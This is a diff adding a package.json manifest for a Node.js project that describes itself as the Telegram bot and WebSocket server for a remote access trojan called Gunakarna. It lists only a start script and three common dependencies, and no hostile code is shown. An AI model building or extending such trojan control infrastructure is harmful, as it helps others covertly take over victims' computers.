@@ -1,0 +1,14 @@
+{
+  "name": "gunakarna-bot-server",
+  "version": "1.0.0",
+  "description": "Telegram bot + WebSocket server for Gunakarna RAT",
+  "main": "bot.js",
+  "scripts": {
+    "start": "node bot.js"
+  },
+  "dependencies": {
+    "node-telegram-bot-api": "^0.64.0",
+    "ws": "^8.16.0",
+    "uuid": "^9.0.0"
+  }
+}
